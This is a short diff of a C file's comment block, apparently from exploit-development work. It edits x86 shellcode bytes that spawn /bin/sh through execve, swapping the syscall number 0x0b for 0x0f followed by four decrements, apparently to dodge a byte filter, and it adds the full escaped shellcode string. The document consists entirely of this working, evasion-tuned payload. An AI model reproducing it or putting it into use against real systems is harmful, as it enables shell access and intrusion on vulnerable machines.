@@ -50,7 +50,11 @@ int main() {
 50
 53
 89 e1
-b0 0b
+b0 0f
+fe c8
+fe c8
+fe c8
+fe c8
 31 d2
 51
 52
@@ -58,5 +62,5 @@ b0 0b
 89 e5
 0f 34
 cd 80
- 
+'1\xc0Ph//shh/bin\x89\xe3PPS\x89\xe1\xb0\x0f\xfe\xc8\xfe\xc8\xfe\xc8\xfe\xc81\xd2QRU\x89\xe5\x0f4\xcd\x80'
  */
